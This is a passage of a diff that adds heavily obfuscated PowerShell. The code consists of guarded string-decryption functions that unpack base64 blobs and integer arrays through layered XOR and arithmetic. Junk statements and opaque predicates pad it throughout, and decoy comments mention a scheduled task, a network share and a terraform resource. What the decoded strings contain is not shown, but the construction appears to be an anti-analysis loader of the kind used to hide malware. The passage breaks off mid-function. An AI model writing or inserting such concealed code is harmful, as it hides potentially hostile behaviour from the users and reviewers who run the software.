+        elseif ([long]$v -ge 0x10000 -and [long]$v -le 0x10FFFF) { $r += [System.Char]::ConvertFromUtf32([int][long]$v) }
+    }
+    $_yrXCBWiz_Hi7 = [Math]::Abs([Math]::Max([Math]::Abs(582), 49))
+[void]$_yrXCBWiz_Hi7
+return $r
+}
+#	. X:\mounted\WindowsPowerShell\v1.0\Modules\rapid-yard\tools\rapid-snapshot\YzZiIR_serial_tenant_62202.ps1xml
+# Out-String << .\silent_mutex\loose_buffer_71254.ps1xml
+# scheduled task action .\nested-bridge\hidden_locker\nested-kernel\loose_realm_98225.psm1
+try {$null = (@(60, 264, 324)).Count} finally {0 | Out-Null}
+$UvjNdbmk = 'KxEX8f0x'.ToLower().ToLower().ToUpper()
+[void]$UvjNdbmk
+function y8UkP0L4FFrAxy {
+    param([int]$a, [int]$b, [int]$c)
+    $tVa3uO8WMKOX = @"
+ Reset-DAEntryPointTableItem Compress-PSResource Stop-Trace Format-Volume Add-Content Get-IscsiConnection Get-NCSIPolicyConfiguration end Debug-StorageSubSystem Optimize-AppProvisionedPackages Add-History Remove-DnsClientNrptRule Receive-DtcDiagnosticTransaction Set-Partition Remove-PartitionAccessPath Enable-WindowsOptionalFeature Disable-TlsEccCurve Remove-VirtualDisk Get-WindowsUpdateLog Add-AppProvisionedPackage New-ItemProperty Mount-AppxVolume ConvertTo-SecureString Set-MpPreference Get-Language Enable-NetDnsTransitionConfiguration Write-DtcTransactionsTraceSession Remove-AppPackage pumo Get-DiskSNV function Get-EventSubscriber Revoke-FileShareAccess Remove-NetEventNetworkAdapter Get-NetQosPolicy New-
+"@
+$null = $tVa3uO8WMKOX.Length
+if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    if ((($script:e5JIFRye9ZmUgRVb -bxor ([int]((((((591025117L) + 593L + 45L) - 45L - 593L)) + (2141L - 2141L))))) -eq ([int]((((((0x400A690L) + 9232L) - 9232L) + 1657L + 794L) - 794L - 1657L))))) { $_jPrX49ocO = -112 }
+try{
+    [void](740 -bxor 330)
+} finally{
+    $null = [Math]::Sign(2)
+}
+$G9TdxZXjeQBrr = @{ 'gZ2s' = 130; 'Whv0' = 969; 'ZNAO' = 637 }
+$G9TdxZXjeQBrr['CQ46_'] = $G9TdxZXjeQBrr['gZ2s'] + $G9TdxZXjeQBrr['Whv0']
+$yh9hVpQGKYP2S = ($G9TdxZXjeQBrr.Values | Measure-Object -Sum).Sum
+[void]$yh9hVpQGKYP2S
+if ((((($a * 13) + $b) -band 8191) -ne $c)) { return '' }
+    	$SNwLePR5Kn2nj = 845
+switch ($SNwLePR5Kn2nj) {
+    893 { $SX6zveT70ZN = 'qU2us' }
+    932 { $SX6zveT70ZN = 'gzYTY' }
+    default { $SX6zveT70ZN = $SNwLePR5Kn2nj * 2 }
+}
+[void]$SX6zveT70ZN
+try {
+    try {
+      [void]('dWE98XVKqk'.Length)
+    } finally {
+      try {1 | Out-Null} finally { $null = (533 + 216) }
+    }
+} finally {
+    [void]([Math]::Max(240, 626))
+}
+if ((($script:e5JIFRye9ZmUgRVb -bxor ([int](((((((0x9F3E542L) + 3779L + 265L) - 265L - 3779L)) + 1981L + 21L) - 21L - 1981L)))) -eq ([int]((((0x2EC97360L) + 843L + 143L) - 143L - 843L))))) {
+    $GxFHniTt85jjcIQ = 1343
+    if ((20 -ne -18)) { $F6e8Kp0tnriDvI = $GxFHniTt85jjcIQ * 2 }
+    else { $F6e8Kp0tnriDvI = $GxFHniTt85jjcIQ - 6534 }
+} else {
+    $GxFHniTt85jjcIQ = 6534
+}
+[void]$GxFHniTt85jjcIQ
+return (& SWhfkCsFF0dMG29p $a $b $c)
+}
+try {
+     $null = [Convert]::ToString(82, 16)
+ } finally {
+     [void](901 -bxor 497)
+ }
+$LMnEq3Rr = 59 * 109 + 1
+$uYSVNqWmVr_ = [Math]::Abs($LMnEq3Rr - 3307)
+$wHlct0UawZbK = [Math]::Max($LMnEq3Rr, $uYSVNqWmVr_) - [Math]::Min($LMnEq3Rr, $uYSVNqWmVr_)
+[void]$wHlct0UawZbK
+function Mez87IILYm {
+    param([int]$x, [int]$y)
+    #  . \\sansouth.local\public\pinned\tC_wYVBB_cached_digest_1088.ps1xml
+# terraform null_resource .\tf\silent-forge\stale_locker_10299.psd1
+if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    $a = $x -bxor 6494
+    $b = $y -bxor 4286
+    $c = ((($a * 13) + $b) -band 8191)
+    return (& y8UkP0L4FFrAxy $a $b $c)
+}
+
+	if ((($script:e5JIFRye9ZmUgRVb -band ([int]((((0x5684L) + 1554L + 933L) - 933L - 1554L)))) -eq ([int](((((((0x5196L) + 3010L + 891L) - 891L - 3010L)) + 2454L + 1467L) - 1467L - 2454L))))) {
+    $qtPyRU1Py = 2843
+    if ((([int]$script:e5JIFRye9ZmUgRVb -shl 0) -eq ([int]((((658175309L) + 1549L + 1380L) - 1380L - 1549L))))) { $LqYDx1 = $qtPyRU1Py * 2 }
+    else { $LqYDx1 = $qtPyRU1Py - 9717 }
+} else {
+    $qtPyRU1Py = 9717
+}
+[void]$qtPyRU1Py
+try{ [void](739 -band 49); }finally{ [void]([Math]::Min(178, 897)) }
+$PZEs1 = 82 * 286 + 42
+$XIbrn = [Math]::Abs($PZEs1 - 5281)
+$sP5bVqRRhYqAb_o = [Math]::Max($PZEs1, $XIbrn) - [Math]::Min($PZEs1, $XIbrn)
+[void]$sP5bVqRRhYqAb_o
+function xxEkLitVBcysw3Up {
+    param([int]$slot, [int]$salt, [int]$guard)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    foreach ($rwFaXI in @()) { $sbUc0uFQ = 7591 }
+if ((((($slot * 41) + $salt) -band 65535) -ne $guard)) { return '' }
+    $tk = (Get-Variable -Name q4VwXLG -Scope Script -ErrorAction SilentlyContinue).Value
+    try {
+    $kySV1QI1ZZCyJcx = 337 + 608
+    $ju_vLrqMZ = [Math]::Pow($kySV1QI1ZZCyJcx, 2)
+} catch {
+    $ju_vLrqMZ = [Math]::Abs(337 - 608)
+}
+[void]$ju_vLrqMZ
+if ($null -eq $tk) { [long]$tk = 0 }
+    $dk = (Get-Variable -Name oY5vcjJrM -Scope Script -ErrorAction SilentlyContinue).Value
+    $iXdybc16uWBJ = @(736, 48, 516, -587, 541)
+$Z0Itr = 0
+foreach ($ybnSEmbg2 in $iXdybc16uWBJ) { $Z0Itr = $Z0Itr + $ybnSEmbg2 }
+[void]$Z0Itr
+if ($null -eq $dk) { [long]$dk = 0 }
+    $d = @(33131, 32993, 32913, 32936, 32991, 32994, 33009, 33014, 33004, 33212, 32968, 32965, 33025)
+    $r = ''
+    for ($Nh7n5oVY = $d.Length - 1; $Nh7n5oVY -ge 0; $Nh7n5oVY--) {
+        [long]$v = [long]$d[$Nh7n5oVY]
+        for ($NH3ayyHCrFK3V = 0; $NH3ayyHCrFK3V -ge 0; $NH3ayyHCrFK3V--) {
+            for ($OzLHNCPXVdlDt = 0; $OzLHNCPXVdlDt -ge 0; $OzLHNCPXVdlDt--) {
+                for ($oe2Nc6FNV5b4 = 2; $oe2Nc6FNV5b4 -ge 0; $oe2Nc6FNV5b4--) {
+                        [long]$v = [long](-bnot ([long]$v -bxor ([long]([int]((((((19935 + $Nh7n5oVY + (-6 * $NH3ayyHCrFK3V) + (4 * $OzLHNCPXVdlDt) + (-2 * $oe2Nc6FNV5b4))) % 65536) + 65536) % 65536))))))
+                        [long]$v = [long]$v -bxor ([long](53187))
+                }
+            }
+        }
+        for ($v5iqXDyNjt = 0; $v5iqXDyNjt -ge 0; $v5iqXDyNjt--) {
+                [long]$v = [long]$v + ([long](36))
+                [long]$v = [long](-bnot ([long]$v -bxor ([long]([int]((((((14071 + (-5 * $Nh7n5oVY) + (3 * $v5iqXDyNjt))) % 65536) + 65536) % 65536))))))
+        }
+        for ($ELSerMyVyg = 0; $ELSerMyVyg -ge 0; $ELSerMyVyg--) {
+            for ($vfScsTO13PCB = 0; $vfScsTO13PCB -ge 0; $vfScsTO13PCB--) {
+                for ($mWMeHPK5Eaafcic = 0; $mWMeHPK5Eaafcic -ge 0; $mWMeHPK5Eaafcic--) {
+                        [long]$v = [long]$v -bxor ([long](45099))
+                        [long]$v = [long]$v -bxor ([long](22970))
+                        [long]$v = [long]$v -bxor ([long](52442))
+                }
+            }
+        }
+        [long]$v = [long]$v - ([long]($salt + $slot + $tk + $dk + 0))
+        if ([long]$v -ge 0 -and [long]$v -le 0xFFFF) { $r = [char][int][long]$v + $r }
+        elseif ([long]$v -ge 0x10000 -and [long]$v -le 0x10FFFF) { $r = [System.Char]::ConvertFromUtf32([int][long]$v) + $r }
+    }
+    try { $_Gv_bWGmZ7a = [Math]::Sqrt(4876) } finally { [void]$_Gv_bWGmZ7a }
+return $r
+}
+try{ $null = [Convert]::ToString(196, 16);  }finally{ $null = (607 + 614) }
+while ((($script:e5JIFRye9ZmUgRVb -bxor ([int](((((((1876271679L) + 2498L + 310L) - 310L - 2498L)) + 2006L + 1293L) - 1293L - 2006L)))) -eq ([int](((((((1223641071L) + 2519L + 744L) - 744L - 2519L)) + 203L + 1861L) - 1861L - 203L))))) { $t7esGkBUu8_V2X0 = 358; break }
+function zPn2dqESmdMS {
+    param([int]$a, [int]$b, [int]$c)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    $ctCv8 = 240
+switch ($ctCv8) {
+    276 { $On18KyT0M = 'AwJuv' }
+    302 { $On18KyT0M = 'Xv36K' }
+    default { $On18KyT0M = $ctCv8 * 2 }
+}
+[void]$On18KyT0M
+if ((((($a * 41) + $b) -band 65535) -ne $c)) { return '' }
+    for ($_xjcv6i = 0; $_xjcv6i -lt 0; $_xjcv6i++) { $amnTatmyWnpqp = 5231 }
+try {$null = (160 + 110)} finally { [void](179 -bxor 735); $null = [Convert]::ToString(206, 16) }
+return (& xxEkLitVBcysw3Up $a $b $c)
+}
+$_BKjvgUiF = 0; for ($B3WXGNSR9XDUV = 0; $B3WXGNSR9XDUV -lt 1; $B3WXGNSR9XDUV++) { $_BKjvgUiF = $_BKjvgUiF + $B3WXGNSR9XDUV }; [void]$_BKjvgUiF
+function qVBEnrY_QBC {
+    param([int]$x, [int]$y)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    try {
+    $QmOB8s = 350 + 800
+    $hP2UI5jH = [Math]::Pow($QmOB8s, 2)
+} catch {
+    $hP2UI5jH = [Math]::Abs(350 - 800)
+}
+[void]$hP2UI5jH
+try{ [void]('TgdMvyOWDU'.Length);  }finally{ $null = (@(154, 772, 926)).Count }
+$a = $x -bxor 6220
+    if ([Math]::Abs(-111)-ne111) { $O4LGAouJU = '_Ad7YEziyu'.GetHashCode() }
+try {
+   1..4 | Out-Null
+} finally {
+   try{
+      1..4 | Out-Null
+   } finally {
+      $null = [Math]::Sign(-29)
+   }
+}
+try {
+    $KXOPPa = 582 + 404
+    $I7nyTePr1 = [Math]::Pow($KXOPPa, 2)
+} catch {
+    $I7nyTePr1 = [Math]::Abs(582 - 404)
+}
+[void]$I7nyTePr1
+$b = $y -bxor 2326
+    @(-756, -982, 915, -566, -204) | Sort-Object | Select-Object -First 1 | Out-Null
+try {
+  try{
+    try { $null = [Convert]::ToString(228, 16) } finally {$null = [Convert]::ToString(624, 16)}
+  } finally {
+    [void]([Math]::Max(545, 819))
+  }
+} finally {
+  [void](695 -band 165)
+}
+$c = ((($a * 41) + $b) -band 65535)
+    @('Joe', 'OqvO', 'trQ2Y') | ForEach-Object { $_.ToUpper() } | Out-Null
+return (& zPn2dqESmdMS $a $b $c)
+}
+
+try {  $null = (930 + 818) } finally { $null = (213 + 358);0 | Out-Null  }
+function nX0MLJdXUp3Il8fTW {
+    param([int]$slot, [int]$salt, [int]$guard)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    if ((([int]$script:e5JIFRye9ZmUgRVb) -eq ([int](((0x273AF958L) - 1949L) + 1949L)))) { $EHxkBSVd = [Math]::Abs(-264) }
+if ((((($slot * 17) + $salt) -band 65535) -ne $guard)) { return '' }
+    if ((([int]$script:e5JIFRye9ZmUgRVb -shl 0) -eq ([int](((((((658175309L) + 1387L + 304L) - 304L - 1387L)) + 193L + 767L) - 767L - 193L))))) { $iC42S2N4 = 48 }
+$tk = (Get-Variable -Name q4VwXLG -Scope Script -ErrorAction SilentlyContinue).Value
+    foreach ($qZXAV in @()) { $_WQknYFYnZAG = 6179 }
+if ($null -eq $tk) { [long]$tk = 0 }
+    $dk = (Get-Variable -Name oY5vcjJrM -Scope Script -ErrorAction SilentlyContinue).Value
+    $imcVi69zZC3VmE = 's9Ay5w9ouMu'.Replace('9', 'r').Replace('M', 'u').Substring(0, 1)
+[void]$imcVi69zZC3VmE
+if ($null -eq $dk) { [long]$dk = 0 }
+    if ((($script:e5JIFRye9ZmUgRVb -band ([int]((((((0x3687L) + 830L + 98L) - 98L - 830L)) + 23284L) - 23284L))) -eq ([int]((((0x3405L) + 4067L + 1052L) - 1052L - 4067L))))) { $Jl7gTo = -9328 }
+$raw = [Convert]::FromBase64String('7FMAAAAAAAA5lwAAAAAAAF7bAAAAAAAAqB4BAAAAAAD6QgEAAAAAAN2GAQAAAAAAlsoBAAAAAAAcDQIAAAAAALZxAgAAAAAAirUCAAAAAADc+QIAAAAAAJg9AwAAAAAAV2EDAAAAAAAppQMAAAAAALbmAwAAAAAAMyoEAAAAAAB8bgQAAAAAAITSBAAAAAAA8ggFAAAAAAAzRgUAAAAAAJiFBQAAAAAAF9oFAAAAAAA=')
+    @(457, -223, -153, -45) | Where-Object { $_ -gt 1 } | ForEach-Object { [Math]::Pow($_, 2) } | Out-Null
+$d = New-Object 'long[]' (22)
+    $rHfIvBwL0NB7qRwt = [Math]::Max([Math]::Abs([Math]::Pow(186, 2)), 39)
+[void]$rHfIvBwL0NB7qRwt
+for ($KK3mQr1RC = 0; $KK3mQr1RC -lt $d.Length; $KK3mQr1RC++) {
+        [long]$v = [BitConverter]::ToInt64($raw, $KK3mQr1RC * 8)
+        $d[$KK3mQr1RC] = $v -bxor (17335 * ($KK3mQr1RC + 1))
+    }
+    $r = ''
+    $Ns8PmKVLtUGyGO = @(693, 907, -570, -976, 332, -387)
+$v34846b10c = 0
+foreach ($_V7Bv8pJOb in $Ns8PmKVLtUGyGO) { $v34846b10c = $v34846b10c + $_V7Bv8pJOb }
+[void]$v34846b10c
+for ($Jzm3PVsp8eAEYObs = 0; $Jzm3PVsp8eAEYObs -lt $d.Length; $Jzm3PVsp8eAEYObs++) {
+        [long]$v = [long]$d[$Jzm3PVsp8eAEYObs]
+        for ($Gkzc3XjvK8YSvu = 2; $Gkzc3XjvK8YSvu -ge 0; $Gkzc3XjvK8YSvu--) {
+                [long]$v = [long]$v - ([long]([int]((((((195 + (-3 * $Jzm3PVsp8eAEYObs) + $Gkzc3XjvK8YSvu)) % 256) + 256) % 256))))
+        }
+        for ($I3yo4jf8dekUz = 1; $I3yo4jf8dekUz -ge 0; $I3yo4jf8dekUz--) {
+                [long]$v = [long]$v - ([long]((5978) % (9)))
+                [long]$v = [long]$v -bxor ([long]([int]((((((726 + (4 * $Jzm3PVsp8eAEYObs) + (3 * $I3yo4jf8dekUz))) % 65536) + 65536) % 65536))))
+        }
+        for ($UhsLYAqanCT3 = 0; $UhsLYAqanCT3 -ge 0; $UhsLYAqanCT3--) {
+            for ($AaejY5n_9nOV = 2; $AaejY5n_9nOV -ge 0; $AaejY5n_9nOV--) {
+                for ($oY_DwbLE = 1; $oY_DwbLE -ge 0; $oY_DwbLE--) {
+                        [long]$v = [long]$v - ([long](77))
+                        [long]$v = [long]$v + ([long]([int]((((((64 + (-4 * $Jzm3PVsp8eAEYObs) + (-4 * $UhsLYAqanCT3) + (4 * $AaejY5n_9nOV) + (7 * $oY_DwbLE))) % 256) + 256) % 256))))
+                }
+            }
+        }
+        [long]$v = [long]$v - ([long]($salt + $slot + $tk + $dk + 0))
+        if ([long]$v -ge 0 -and [long]$v -le 0xFFFF) { $r += [char][int][long]$v }
+        elseif ([long]$v -ge 0x10000 -and [long]$v -le 0x10FFFF) { $r += [System.Char]::ConvertFromUtf32([int][long]$v) }
+    }
+    if ([Math]::Log10(10)-eq2) {
+    $_tPhctNaMRp = 7528
+    if ((($script:e5JIFRye9ZmUgRVb -bxor ([int]((((((0x3ACB787BL) + 3785L + 2018L) - 2018L - 3785L)) + (2195L - 2195L))))) -eq ([int]((((((0x1DF18D36L) + 3831L) - 3831L) + 1605L + 887L) - 887L - 1605L))))) { $KnF8xzmqZF5x = $_tPhctNaMRp * 2 }
+    else { $KnF8xzmqZF5x = $_tPhctNaMRp - 5107 }
+} else {
+    $_tPhctNaMRp = 5107
+}
+[void]$_tPhctNaMRp
+return $r
+}
+if (([Math]::Abs(459) -ge 0)) { $aH2TNwPTVPsOs = 8556 }
+try {
+    [void]([Math]::Max(549, 725))
+} finally {
+    [void](677 -band 110)
+}
+function x7lxQHaXiYWG {
+    param([int]$a, [int]$b, [int]$c)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    if ((([double]::NaN-eq11.75)-and((($script:e5JIFRye9ZmUgRVb -ne $script:e5JIFRye9ZmUgRVb))))-and(([Math]::Abs(-135) -ne 135)-and((($script:e5JIFRye9ZmUgRVb -ne $script:e5JIFRye9ZmUgRVb))))) { $e6UF4T = @(174, 576, -256); $e6UF4T = ($e6UF4T | Measure-Object -Sum).Sum }
+try {
+     [void](283 -bxor 475)
+} finally {
+     [void]([Math]::Max(745, 996))
+}
+if ((((($a * 17) + $b) -band 65535) -ne $c)) { return '' }
+    try {
+     [void](677 -bxor 28)
+} finally {
+     [void](655 -band 189)
+}
+$lwr73iTTlxhs = '_i9xHYZdxi'.Substring(0, 2).ToLower()
+[void]$lwr73iTTlxhs
+return (& nX0MLJdXUp3Il8fTW $a $b $c)
+}
+function iPEDLSRdNb8ySuwcXS {
+    param([int]$x, [int]$y)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    if ((([int]$script:e5JIFRye9ZmUgRVb) -eq ([int](((0x273AFECFL) + (20462L - 20462L)))))) {
+    $J_FBQkqvy7sx9C = 1136
+    if (((($script:e5JIFRye9ZmUgRVb -bxor ([int]((((0x577A0D97L) + 1071L + 653L) - 653L - 1071L)))) -bxor ([int]((((((1467616663L) - 13120L) + 13120L) + 2004L + 148L) - 148L - 2004L)))) -eq ([int]((((0x273AF54DL) + 451L + 1564L) - 1564L - 451L))))) { $_ZaaSlk5Tscd = $J_FBQkqvy7sx9C * 2 }
+    else { $_ZaaSlk5Tscd = $J_FBQkqvy7sx9C - 5424 }
+} else {
+    $J_FBQkqvy7sx9C = 5424
+}
+[void]$J_FBQkqvy7sx9C
+try {
+    0 | Out-Null
+} finally {
+    [void]([Math]::Max(572, 694))
+}
+$a = $x -bxor 232
+    try {
+     try {
+       [void]([Math]::Abs(-733))
+     } finally {
+       0 | Out-Null
+     }
+} finally {
+     [void]([Math]::Abs(-142))
+}
+$wmTEH = 953
+switch ($wmTEH) {
+    974 { $vc46620b = 'bkSbI' }
+    1041 { $vc46620b = 'QPxS8' }
+    default { $vc46620b = $wmTEH * 2 }
+}
+[void]$vc46620b
+$b = $y -bxor 1156
+    $c = ((($a * 17) + $b) -band 65535)
+    return (& x7lxQHaXiYWG $a $b $c)
+}
+
+for ($_BHrGdRk7 = 0; $_BHrGdRk7 -lt 0; $_BHrGdRk7++) { $ilNfG = 8600 }
+function ooUOQ4FKrS0N50vJgtqG {
+    param([int]$slot, [int]$salt, [int]$guard)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    $jEnrL3r8BMEAdzG95 = 'LZ7d5ckj'.ToUpper().ToLower()
+[void]$jEnrL3r8BMEAdzG95
+if ((((($slot * 31) + $salt) -band 65535) -ne $guard)) { return '' }
+    if ((([int]$script:e5JIFRye9ZmUgRVb -shl 0) -eq ([int](((((((0x273AF54DL) + 3326L + 313L) - 313L - 3326L)) + 153L + 738L) - 738L - 153L))))) { $_RI8l7E = 97 }
+$tk = (Get-Variable -Name q4VwXLG -Scope Script -ErrorAction SilentlyContinue).Value
+    $dt4tC4THFUkMh = [Math]::Pow([Math]::Pow([Math]::Abs(743), 2), 2)
+[void]$dt4tC4THFUkMh
+if ($null -eq $tk) { [long]$tk = 0 }
+    if ((($script:e5JIFRye9ZmUgRVb -bxor ([int]((((((0x45CA10DFL) + (3634L - 3634L))) + 3484L + 1016L) - 1016L - 3484L)))) -eq ([int](((1659896836L) + 631L) - 631L)))) {
+    $PzzOueNy = 7193
+    if (((@(9).Count) -eq 1)) { $_Z0P7hOTaZ = $PzzOueNy * 2 }
+    else { $_Z0P7hOTaZ = $PzzOueNy - 2193 }
+} else {
+    $PzzOueNy = 2193
+}
+[void]$PzzOueNy
+$dk = (Get-Variable -Name oY5vcjJrM -Scope Script -ErrorAction SilentlyContinue).Value
+    if ($null -eq $dk) { [long]$dk = 0 }
+    $raw = [Convert]::FromBase64String('BSkAAAAAAAC8fwAAAAAAANeCAAAAAAAATtAAAAAAAAAG5QAAAAAAAH0oAQAAAAAATnoBAAAAAAA3jQEAAAAAAETQAQAAAAAAo+IBAAAAAAC0NwIAAAAAADt6AgAAAAAA5YoCAAAAAADm3QIAAAAAADHgAgAAAAAAgTIDAAAAAACtRQMAAAAAAKKJAwAAAAAAjdoDAAAAAABN7AMAAAAAAEIwBAAAAAAAHkMEAAAAAAC3lQQAAAAAAIrZBAAAAAAAweoEAAAAAABhPAUAAAAAAE1BBQAAAAAA/pIFAAAAAABGpAUAAAAAAEfqBQAAAAAA5DkGAAAAAAAfTwYAAAAAAE+SBgAAAAAAwaEGAAAAAADE9gYAAAAAAMs7BwAAAAAAN0oHAAAAAAB9nwcAAAAAAMmiBwAAAAAAi/EHAAAAAAC5BAgAAAAAANxKCAAAAAAAsJkIAAAAAADerAgAAAAAACbyCAAAAAAA1AEJAAAAAAC0VwkAAAAAALaZCQAAAAAAI6oJAAAAAABx/wkAAAAAAIkBCgAAAAAAHlIKAAAAAABJYgoAAAAAALCsCgAAAAAAiv8KAAAAAAALCgsAAAAAAAFVCwAAAAAAbmYLAAAAAADfrQsAAAAAAA==')
+    $xa7c606f9 = [Math]::Sqrt([Math]::Abs([Math]::Sqrt([Math]::Abs([Math]::Abs([Math]::Abs(306))))))
+[void]$xa7c606f9
+$d = New-Object 'long[]' (59)
+    for ($e0Zw4L8D_g7Wqhqd = 0; $e0Zw4L8D_g7Wqhqd -lt $d.Length; $e0Zw4L8D_g7Wqhqd++) {
+        [long]$v = [BitConverter]::ToInt64($raw, $e0Zw4L8D_g7Wqhqd * 8)
+        $d[$e0Zw4L8D_g7Wqhqd] = $v -bxor (12975 * ($e0Zw4L8D_g7Wqhqd + 1))
+    }
+    $_Cpy90g = @(557, -287, -105, -755)
+$v498501b = 0
+foreach ($x2gHD9J in $_Cpy90g) { $v498501b = $v498501b + $x2gHD9J }
+[void]$v498501b
+$r = ''
+    if ((($script:e5JIFRye9ZmUgRVb -ne $script:e5JIFRye9ZmUgRVb))) { $WiL6ybBMH = 'zF45oxpIm7'.GetHashCode() }
+for ($OsG3S_KAMao = 0; $OsG3S_KAMao -lt $d.Length; $OsG3S_KAMao++) {
+        [long]$v = [long]$d[$OsG3S_KAMao]
+        for ($OpDRftOOOAvID2 = 0; $OpDRftOOOAvID2 -ge 0; $OpDRftOOOAvID2--) {
+            for ($LeqvUjdNPD_r = 2; $LeqvUjdNPD_r -ge 0; $LeqvUjdNPD_r--) {
+                for ($g0QV2tgfecTIj9X = 0; $g0QV2tgfecTIj9X -ge 0; $g0QV2tgfecTIj9X--) {
+                        [long]$v = [long]$v -bxor ([long](40400))
+                        [long]$v = [long](-bnot ([long]$v -bxor ([long](12605))))
+                        [long]$v = [long]$v - ([long]([int]((((((187 + (-4 * $OsG3S_KAMao) + (3 * $OpDRftOOOAvID2) + (-3 * $LeqvUjdNPD_r) + (-1 * $g0QV2tgfecTIj9X))) % 256) + 256) % 256))))
+                }
+            }
+        }
+        for ($Sg9v0UDNIKXjvxmY = 0; $Sg9v0UDNIKXjvxmY -ge 0; $Sg9v0UDNIKXjvxmY--) {
+                [long]$v = [long]$v -bxor ([long](13775))
+                [long]$v = [long]$v -bxor ([long]([int]((((((37631 + (5 * $OsG3S_KAMao) + $Sg9v0UDNIKXjvxmY)) % 65536) + 65536) % 65536))))
+        }
+        for ($KFCb7LAMWP = 0; $KFCb7LAMWP -ge 0; $KFCb7LAMWP--) {
+            for ($lVhqFVNVks6EBg = 2; $lVhqFVNVks6EBg -ge 0; $lVhqFVNVks6EBg--) {
+                    [long]$v = [long]$v - ([long]((4564) % (38)))
+                    [long]$v = [long](-bnot $v)
+            }
+        }
+        [long]$v = [long]$v - ([long]($salt + $slot + $tk + $dk + 0))
+        if ([long]$v -ge 0 -and [long]$v -le 0xFFFF) { $r += [char][int][long]$v }
+        elseif ([long]$v -ge 0x10000 -and [long]$v -le 0x10FFFF) { $r += [System.Char]::ConvertFromUtf32([int][long]$v) }
+    }
+    if ((([int]$script:e5JIFRye9ZmUgRVb) -eq ([int](((0x273AF1C8L) - 2916L) + 2916L)))) {
+    $XMJzOarFat = 9727
+    if ((([int]$script:e5JIFRye9ZmUgRVb -shl 0) -eq ([int]((((0x273AF54DL) + 2193L + 266L) - 266L - 2193L))))) { $IXlfkB5tob8E = $XMJzOarFat * 2 }
+    else { $IXlfkB5tob8E = $XMJzOarFat - 3200 }
+} else {
+    $XMJzOarFat = 3200
+}
+[void]$XMJzOarFat
+return $r
+}
+function IwXnGMYe0R4bEnJ4y {
+    param([int]$a, [int]$b, [int]$c)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    if ((((($a * 31) + $b) -band 65535) -ne $c)) { return '' }
+    $_MCSHJc = 777
+switch ($_MCSHJc) {
+    797 { $xec68911a = 'mAspA' }
+    839 { $xec68911a = 'Z3dHJ' }
+    default { $xec68911a = $_MCSHJc * 2 }
+}
+[void]$xec68911a
+return (& ooUOQ4FKrS0N50vJgtqG $a $b $c)
+}
+if ((($script:e5JIFRye9ZmUgRVb -bxor ([int]((((913608172L) + 3732L + 1540L) - 1540L - 3732L)))) -eq ([int](((0x114E4598L) + (3855L - 3855L)))))) {
+    $acoZMsSQEj47G = 9102
+    if ((([int]$script:e5JIFRye9ZmUgRVb -shl 0) -eq ([int]((((658175309L) + 3985L + 765L) - 765L - 3985L))))) { $OmrNd5cQuYYRFJ9V = $acoZMsSQEj47G * 2 }
+    else { $OmrNd5cQuYYRFJ9V = $acoZMsSQEj47G - 133 }
+} else {
+    $acoZMsSQEj47G = 133
+}
+[void]$acoZMsSQEj47G
+function cVIz2cKWBGivpYIq {
+    param([int]$x, [int]$y)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    $a = $x -bxor 4596
+    $b = $y -bxor 623
+    try { $_d9kb2gRoj4I = 7082 } catch { [void]$_ }
+$c = ((($a * 31) + $b) -band 65535)
+    if ((($script:e5JIFRye9ZmUgRVb -bxor ([int](((((((1084545152L) + 689L + 1873L) - 1873L - 689L)) + 967L + 1798L) - 1798L - 967L)))) -eq ([int](((1738417408L) - 1212L) + 1212L)))) {
+    $uZH7AT = 1480
+    if ((-not(-not([bool]14)))) { $_Vrw4KX910 = $uZH7AT * 2 }
+    else { $_Vrw4KX910 = $uZH7AT - 3706 }
+} else {
+    $uZH7AT = 3706
+}
+[void]$uZH7AT
+return (& IwXnGMYe0R4bEnJ4y $a $b $c)
+}
+
+if (([bool]-228)) { $mCdyU = -4330 }
+function uQr9zgg4YiF {
+    param([int]$slot, [int]$salt, [int]$guard)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    $_IE5CEpz = @{ 'Tcrf' = 460; 'HYHj' = 49; 'uZSz' = 973 }
+$_IE5CEpz['yG5K2'] = $_IE5CEpz['Tcrf'] + $_IE5CEpz['HYHj']
+$p_RoYSN5Q = ($_IE5CEpz.Values | Measure-Object -Sum).Sum
+[void]$p_RoYSN5Q
+if ((((($slot * 17) + $salt) -band 65535) -ne $guard)) { return '' }
+    @('Waj', 'qUpm', 'Qv9nY') | ForEach-Object { $_.ToUpper() } | Out-Null
+$tk = (Get-Variable -Name q4VwXLG -Scope Script -ErrorAction SilentlyContinue).Value
+    if ($null -eq $tk) { [long]$tk = 0 }
+    $_gH8R2A8FlXm = 248
+switch ($_gH8R2A8FlXm) {
+    282 { $v5b7742f71f = 'QbjSp' }
+    313 { $v5b7742f71f = 'RmqmE' }
+    default { $v5b7742f71f = $_gH8R2A8FlXm * 2 }
+}
+[void]$v5b7742f71f
+$dk = (Get-Variable -Name oY5vcjJrM -Scope Script -ErrorAction SilentlyContinue).Value
+    if ($null -eq $dk) { [long]$dk = 0 }
+    $d = @(10486, 10489, 10525, 10489, 10487, 10489, 10481, 10550, 10554, 10540, 10489, 10544, 10483, 10529, 10480, 10491)
+    1..6 | ForEach-Object { $_ * 6 } | Out-Null
+$r = ''
+    for ($TuBrK_mNrYB3 = 0; $TuBrK_mNrYB3 -lt $d.Length; $TuBrK_mNrYB3++) {
